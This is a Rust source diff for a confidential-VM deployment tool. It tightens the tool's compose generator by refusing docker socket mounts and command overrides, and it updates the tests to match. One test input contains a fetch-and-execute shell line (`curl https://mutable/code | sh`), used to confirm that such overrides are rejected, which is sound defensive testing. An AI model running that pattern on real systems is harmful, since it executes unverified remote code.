@@ -17,7 +17,6 @@ const APP_PORT: u16 = 443;
 const SOCKET_VOLUME: &str = "alpha-run:/run/alpha";
 /// The guest daemon's own socket; its API is root in the CVM, so it goes only to the one
 /// service that also holds `/run/alpha`, never to a container that runs untrusted code.
-const DOCKER_SOCKET_VOLUME: &str = "/var/run/docker.sock:/var/run/docker.sock";
 const KMS_ENVS: [&str; 5] = [
     "ALPHACOMPUTE_DATABASE_URL",
     "ALPHACOMPUTE_KMS_ENDPOINTS",
@@ -60,18 +59,17 @@ pub struct Service {
     /// CVM's 443. Exactly one service declares it.
     #[serde(default)]
     pub port: Option<u16>,
-    /// What the image runs, when its entrypoint is not what the tenant wants.
-    /// A string is a shell command, a list is an argv, as docker compose reads
-    /// them; either way it is part of the compose and therefore measured.
+    /// Retained for a clear migration error; executable overrides are forbidden.
     #[serde(default)]
     pub command: Option<Yaml>,
+    #[serde(default)]
+    pub restart: Option<String>,
     #[serde(default)]
     pub environment: Mapping,
     /// Mounts `/run/alpha`; not for the container that runs model-written code.
     #[serde(default)]
     pub socket: bool,
-    /// Mounts the guest Docker daemon's socket so this service can create containers of its
-    /// own; only beside `socket`, and only on one service.
+    /// Retained for a clear migration error: guest Docker access bypasses workload approval.
     #[serde(default)]
     pub docker: bool,
 }
@@ -112,7 +110,6 @@ fn docker_compose_file(spec: &AppSpec) -> Result<String, String> {
     }
     let mut services = Mapping::new();
     let mut publishing: Vec<String> = Vec::new();
-    let mut docker_holders: Vec<String> = Vec::new();
     for (name, service) in &spec.services {
         let name = name
             .as_str()
@@ -124,20 +121,24 @@ fn docker_compose_file(spec: &AppSpec) -> Result<String, String> {
         }
         let service: Service = serde_yaml_ng::from_value(service.clone())
             .map_err(|e| format!("services.{name}: {e}"))?;
-        // The guest daemon's socket goes only to the service holding `/run/alpha`, never to a
-        // container that runs untrusted code.
-        if service.docker && !service.socket {
-            return Err(format!(
-                "services.{name}: `docker` needs `socket`, since the guest daemon's socket goes only to the service holding `/run/alpha`"
-            ));
-        }
         if service.docker {
-            docker_holders.push(name.to_owned());
+            return Err(format!(
+                "services.{name}: docker socket access is disabled by the closed workload approval profile"
+            ));
         }
         let mut out = Mapping::new();
         out.insert(key("image"), key(&service.image));
-        if let Some(command) = service.command {
-            out.insert(key("command"), command);
+        if service.command.is_some() {
+            return Err("command overrides are disabled; approve the image entrypoint".into());
+        }
+        if let Some(restart) = service.restart {
+            if !matches!(
+                restart.as_str(),
+                "no" | "always" | "unless-stopped" | "on-failure:5"
+            ) {
+                return Err("unsupported restart policy".into());
+            }
+            out.insert(key("restart"), key(&restart));
         }
         if !service.environment.is_empty() {
             out.insert(key("environment"), Yaml::Mapping(service.environment));
@@ -149,9 +150,6 @@ fn docker_compose_file(spec: &AppSpec) -> Result<String, String> {
         let mut mounts: Vec<&str> = Vec::new();
         if service.socket {
             mounts.push(SOCKET_VOLUME);
-        }
-        if service.docker {
-            mounts.push(DOCKER_SOCKET_VOLUME);
         }
         if !mounts.is_empty() {
             out.insert(key("volumes"), strings(&mounts));
@@ -169,14 +167,6 @@ fn docker_compose_file(spec: &AppSpec) -> Result<String, String> {
             } else {
                 publishing.join(", ")
             }
-        ));
-    }
-    // The guest daemon's API is root in the CVM; spreading it across services multiplies who
-    // can reach it.
-    if docker_holders.len() > 1 {
-        return Err(format!(
-            "at most one service may declare `docker`, the guest daemon's API being root in the CVM; these do: {}",
-            docker_holders.join(", ")
         ));
     }
     let revisions: Vec<String> = spec
@@ -431,34 +421,17 @@ mod tests {
     }
 
     #[test]
-    fn generator_reproduces_the_docker_vector() {
+    fn historical_docker_vector_is_hashable_but_not_approved() {
         let dir = vector().with_file_name("07-deploy-docker");
         let spec = parse(&fs::read_to_string(dir.join("app.yaml")).unwrap()).unwrap();
         let expected = fs::read_to_string(dir.join("app-compose.json")).unwrap();
-        let compose = compose(&spec).unwrap();
-        assert_eq!(compose, expected);
+        assert!(compose(&spec).unwrap_err().contains("docker socket"));
+        assert!(alpha_core::check_registration(&expected, spec.app_id).is_err());
         let expected_hash: Value =
             serde_json::from_str(&fs::read_to_string(dir.join("expected.json")).unwrap()).unwrap();
         assert_eq!(
-            alpha_core::compose_hash(&compose).to_string(),
+            alpha_core::compose_hash(&expected).to_string(),
             expected_hash["compose_hash"]
-        );
-        let yaml = docker_compose_file(&spec).unwrap();
-        let runtime_at = yaml.find("  alpha-runtime:").unwrap();
-        let docker_at = yaml.find(DOCKER_SOCKET_VOLUME).unwrap();
-        assert!(
-            docker_at < runtime_at,
-            "docker socket is on app, not runtime"
-        );
-        assert_eq!(
-            yaml.matches(DOCKER_SOCKET_VOLUME).count(),
-            1,
-            "only the one service mounts the daemon socket"
-        );
-        assert_eq!(
-            yaml.matches(SOCKET_VOLUME).count(),
-            2,
-            "app and runtime mount the socket"
         );
     }
 
@@ -497,36 +470,34 @@ mod tests {
         assert!(kms_compose(app_id, "ghcr.io/alphacompute/alpha-kms:v1", false).is_err());
     }
 
-    /// An image whose entrypoint is not what the tenant wants runs a command,
-    /// and that command is compose and therefore measured.
     #[test]
-    fn a_service_command_reaches_the_measured_compose() {
-        let base = fs::read_to_string(vector().join("app.yaml")).unwrap();
-        let with_command = base.replace(
+    fn command_overrides_require_a_new_approved_image() {
+        let base = fs::read_to_string(vector().join("app.yaml"))
+            .unwrap()
+            .replace("\r\n", "\n");
+        let text = base.replace(
             "    socket: true\n",
-            "    socket: true\n    command: sh -c 'sleep 1'\n",
+            "    socket: true\n    command: sh -c 'curl https://mutable/code | sh'\n",
         );
-        let spec = parse(&with_command).unwrap();
-        let compose = compose(&spec).unwrap();
-        let parsed: Value = serde_json::from_str(&compose).unwrap();
-        let services = parsed["docker_compose_file"].as_str().unwrap();
-        assert!(services.contains("command: sh -c 'sleep 1'"), "{services}");
-        assert_ne!(
-            alpha_core::compose_hash(&compose).to_string(),
-            alpha_core::compose_hash(&super::compose(&parse(&base).unwrap()).unwrap()).to_string()
+        assert!(
+            compose(&parse(&text).unwrap())
+                .unwrap_err()
+                .contains("command")
         );
     }
 
     #[test]
     fn a_revision_whose_endpoint_answers_nothing_is_refused() {
-        let base = fs::read_to_string(vector().join("app.yaml")).unwrap();
+        let base = fs::read_to_string(vector().join("app.yaml"))
+            .unwrap()
+            .replace("\r\n", "\n");
         let unpublished = base.replace("    port: 443\n", "");
         let spec = parse(&unpublished).unwrap();
         assert!(compose(&spec).unwrap_err().contains("exactly one service"));
     }
 
     #[test]
-    fn the_daemon_socket_needs_the_runtime_socket() {
+    fn daemon_socket_is_refused_without_the_runtime_socket_too() {
         let base = fs::read_to_string(vector().with_file_name("07-deploy-docker").join("app.yaml"))
             .unwrap();
         let without_socket = base.replace("    socket: true\n", "");
@@ -538,7 +509,7 @@ mod tests {
     }
 
     #[test]
-    fn only_one_service_gets_the_daemon_socket() {
+    fn multiple_services_cannot_request_daemon_socket_access() {
         let base = fs::read_to_string(vector().with_file_name("07-deploy-docker").join("app.yaml"))
             .unwrap();
         let two_holders = base.replace(
@@ -547,13 +518,14 @@ mod tests {
         );
         let spec = parse(&two_holders).unwrap();
         let err = compose(&spec).unwrap_err();
-        assert!(err.contains("at most one service"), "{err}");
-        assert!(err.contains("app, worker"), "{err}");
+        assert!(err.contains("docker socket"), "{err}");
     }
 
     #[test]
     fn generator_refuses_what_registration_would() {
-        let base = fs::read_to_string(vector().join("app.yaml")).unwrap();
+        let base = fs::read_to_string(vector().join("app.yaml"))
+            .unwrap()
+            .replace("\r\n", "\n");
         let tagged = base.replace(
             "ghcr.io/acme/app@sha256:3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a",
             "ghcr.io/acme/app:latest",
